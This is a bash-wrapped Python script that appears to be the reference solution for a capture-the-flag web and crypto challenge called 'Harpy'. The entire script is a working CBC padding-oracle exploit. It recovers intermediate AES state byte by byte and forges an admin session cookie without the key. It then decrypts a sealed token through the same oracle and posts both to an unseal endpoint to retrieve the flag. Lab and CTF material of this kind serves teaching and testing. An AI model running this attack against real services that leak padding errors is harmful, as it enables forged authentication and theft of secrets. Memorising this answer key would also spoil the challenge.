#!/usr/bin/env bash
set -euo pipefail

# Harpy (web / crypto-oracle, hardened): /api/vault is a CBC PADDING ORACLE. The attack is a
# TWO-DIRECTION oracle chain:
#   1. PO-ENCRYPTION: forge a ciphertext that decrypts to {"role":"admin"} (no key).
#   2. POST it to /api/vault -> receive a SEALED CHALLENGE (E of a secret token).
#   3. PO-DECRYPTION: recover the token by decrypting the challenge with the same oracle.
#   4. POST the forged cookie + token to /api/unseal -> the flag.
# recover_intermediate() drives the byte-by-byte oracle for BOTH directions. Pure stdlib.

python3 - <<'PY'
import http.client
import json

HOST = "target"
PORT = 8254
BS = 16

# one persistent keep-alive connection (thousands of oracle queries -> avoid socket churn)
_conn = [None]


def post(path, **form):
    body = "&".join(f"{k}={v}" for k, v in form.items())
    hdr = {"Content-Type": "application/x-www-form-urlencoded"}
    for attempt in range(3):
        try:
            if _conn[0] is None:
                _conn[0] = http.client.HTTPConnection(HOST, PORT, timeout=30)
            _conn[0].request("POST", path, body, hdr)
            r = _conn[0].getresponse()
            return r.status, json.loads(r.read())
        except Exception:
            try:
                _conn[0].close()
            except Exception:
                pass
            _conn[0] = None
            if attempt == 2:
                raise


def padding_ok(cookie_hex):
    code, body = post("/api/vault", s=cookie_hex)
    return not (code == 400 and "padding" in body.get("error", ""))


def recover_intermediate(block):
    """Recover I = AES_decrypt(block) via the padding oracle (byte-by-byte)."""
    I = bytearray(BS); prefix = bytearray(BS)
    for pad in range(1, BS + 1):
        idx = BS - pad
        for k in range(idx + 1, BS):
            prefix[k] = I[k] ^ pad
        hit = None
        for guess in range(256):
            prefix[idx] = guess
            if padding_ok((bytes(prefix) + block).hex()):
                if pad == 1:
                    prefix[idx - 1] ^= 0xFF
                    ok = padding_ok((bytes(prefix) + block).hex())
                    prefix[idx - 1] ^= 0xFF
                    if not ok:
                        continue
                hit = guess; break
        if hit is None:
            raise RuntimeError(f"oracle stalled at pad={pad}")
        I[idx] = hit ^ pad
    return bytes(I)


def po_encrypt(plaintext):
    """Forge iv||ct decrypting to plaintext (no key), using the oracle."""
    blocks = [plaintext[i:i + BS] for i in range(0, len(plaintext), BS)]
    cur = bytes(range(BS)); cipher = [cur]
    for pt in reversed(blocks):
        inter = recover_intermediate(cur)
        prev = bytes(inter[i] ^ pt[i] for i in range(BS))
        cipher.insert(0, prev); cur = prev
    return b"".join(cipher)


def po_decrypt(blob):
    """Decrypt iv||ct with the oracle (recover plaintext), strip PKCS#7."""
    iv, ct = blob[:BS], blob[BS:]
    out = bytearray(); prev = iv
    for off in range(0, len(ct), BS):
        blk = ct[off:off + BS]
        inter = recover_intermediate(blk)
        out += bytes(inter[i] ^ prev[i] for i in range(BS)); prev = blk
    return bytes(out[:-out[-1]])


# 1) forge admin cookie (the obvious PO-encryption)
admin = b'{"role":"admin"}'
cookie = po_encrypt(admin + bytes([BS]) * BS).hex()
# 2) unlock the vault -> body["vault"] is a DECOY; body["sealed_ref"] holds the real token
code, body = post("/api/vault", s=cookie)
sealed_ref = bytes.fromhex(body["sealed_ref"])
# 3) PO-decrypt the sealed reference -> the vault token (the harder second direction)
token = po_decrypt(sealed_ref)
# 4) answer it to release the root-tier credential
code, body = post("/api/unseal", s=cookie, t=token.hex())
flag = body["vault"]

with open("/app/flags.txt", "w") as f:
    f.write(flag.strip() + "\n")
print("two-direction padding-oracle chain (forge + challenge-decrypt), flag:", flag)
PY
